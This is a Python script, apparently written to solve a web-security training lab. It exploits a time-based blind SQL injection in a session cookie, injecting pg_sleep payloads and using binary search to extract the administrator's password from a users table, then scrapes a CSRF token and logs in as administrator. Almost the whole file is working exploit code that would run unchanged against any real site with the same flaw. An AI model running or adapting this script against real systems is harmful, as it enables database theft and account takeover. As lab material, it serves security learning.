import statistics
import sys
import time
import warnings
from http.cookiejar import Cookie
from typing import Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    DEFAULT_TIMEOUT = (2, 5)
    ASCII_MIN = 32
    ASCII_MAX = 126
    MAX_GUESS_LENGTH = 50

    def __init__(self, base_url) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.session.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self._vuln_cookie_obj: Optional[Cookie] = None
        self.vulnerable_cookie: Optional[str] = None
        self.sleep_time = 2
        self.threshold = 1.5

    def _request(
        self,
        path: str,
        method: str = "GET",
        params: Optional[dict] = None,
        data: Optional[dict] = None,
    ) -> Optional[Response]:
        """Handles all HTTP communication"""
        url = urljoin(self.base_url, path)
        try:
            return self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                timeout=self.DEFAULT_TIMEOUT,
                allow_redirects=True,
                verify=False,
            )
        except RequestException as e:
            print(f"[!] HTTP error: {e}", file=sys.stderr)
            return None

    def is_lab_accessible(self) -> bool:
        print("[*] Cheacking lab availability...")
        res = self._request("")
        return res is not None and "academyLabBanner" in res.text

    def calibrate_timing(self):
        """Measures baseline response time and calculates threshold dynamically"""
        print("[*] Calibrating baseline timing...")

        samples = []
        for _ in range(10):
            start = time.perf_counter()
            self._request("")
            samples.append(time.perf_counter() - start)

        avg = statistics.mean(samples)
        std = statistics.stdev(samples) if len(samples) > 1 else 0.01

        self.threshold = avg + (5 * std)
        self.sleep_time = min(3, round(2.0 * self.threshold))
        print(
            f"[+] Baseline avg: {avg:.3f}s | Threshold: {self.threshold:.3f}s | Sleep: {self.sleep_time}s"
        )

    def _inject_payload(self, sql_condition: str) -> bool:
        """Injects SQL condition into vulnerable cookie, returns True if condition caused delay"""
        if not self.vulnerable_cookie or not self._vuln_cookie_obj:
            return False

        cookie = self._vuln_cookie_obj
        original_value = cookie.value
        payload = (
            f"' ||(SELECT CASE WHEN ({sql_condition}) "
            f"THEN pg_sleep({self.sleep_time}) "
            f"ELSE pg_sleep(0) END) || '"
        )
        cookie.value = f"{original_value}{payload}"

        start = time.perf_counter()
        res = self._request("")
        elapsed = time.perf_counter() - start

        cookie.value = original_value
        if res is None or res.status_code != 200:
            return False
        return elapsed > self.threshold

    def identify_vulnerable_cookie(self) -> Optional[str]:
        """Identifies which cookie is injectable"""
        print("[*] Identifying vulnerable cookie...")

        self.calibrate_timing()

        for cookie in self.session.cookies:
            self._vuln_cookie_obj = cookie
            self.vulnerable_cookie = cookie.name
            if self._inject_payload("1=1"):
                print(f"[+] Vulnerable cookie found: {cookie.name}")
                return cookie.name
        self._vuln_cookie_obj = None
        self.vulnerable_cookie = None
        print("[-] Could not find vulnerable cookie!")
        return None

    def _binary_search(self, low: int, high: int, sql_expression: str) -> int:
        """Helper for extracing numeric results using binary search"""
        while low + 1 < high:
            mid = (high + low) // 2
            condition = f"({sql_expression}) > {mid}"
            # print(f"\r[+] Current binary range: [{low}, {high}] -> {mid}", end="", flush=True,)
            if self._inject_payload(condition):
                low = mid
            else:
                high = mid
        # print()
        return high

    def extract_field(self, column: str, table: str, where_clause: str) -> str:
        """Extracts single field from database"""
        print(f"[*] Extracting {column} from {table}...")
        # Step 1: Identify length
        length_query = (
            f"SELECT LENGTH({column}) FROM {table} WHERE {where_clause} LIMIT 1"
        )
        # length = self.extract_length(length_query)
        length = self._binary_search(1, self.MAX_GUESS_LENGTH, length_query)
        print(f"[+] Detected length: {length}")

        # Step 2: Extract the password
        extracted = ""
        for pos in range(1, length + 1):
            print(f"\r[+] Extracted string: {extracted}", end="", flush=True)
            data_query = f"SELECT ASCII(SUBSTRING({column}, {pos}, 1)) FROM {table} WHERE {where_clause} LIMIT 1"
            ascii_value = self._binary_search(
                self.ASCII_MIN, self.ASCII_MAX, data_query
            )
            extracted += chr(ascii_value)
        print()
        return extracted

    def login_and_verify(self, username: str, password: str) -> bool:
        """Login anf verifies lab solved status"""
        # Step 1: Extract CSRF token from login page
        res_login = self._request("login")
        if res_login is None or res_login.status_code != 200:
            print("[-] Could not load login page!")
            return False

        soup = BeautifulSoup(res_login.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None
        if not csrf_token:
            print("[-] CSRF token not found in login page!")
            return False
        print(f"[+] CSRF Token: {csrf_token}")

        # Step 2: Login
        login_data = {"csrf": csrf_token, "username": username, "password": password}
        self._request("login", method="POST", data=login_data)

        # Step 3: Verify
        dashboard = self._request("")
        return dashboard is not None and "Congratulation" in dashboard.text

    def solve(self) -> None:
        # Check lab availability
        if not self.is_lab_accessible():
            print("[-] Lab unavailable!")
            return

        # Identify the vulnerable cookie
        if not self.identify_vulnerable_cookie():
            return

        # Exfiltrate credentials
        admin_password = self.extract_field(
            column="password", table="users", where_clause="username='administrator'"
        )

        print(f"[+] Administrator password: {admin_password}")

        # login and verify
        if self.login_and_verify("administrator", admin_password):
            print("[✓] SUCCESS: Logged in and lab solved!")
        else:
            print("[-] Lab is not solved!")


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web--security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()
    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
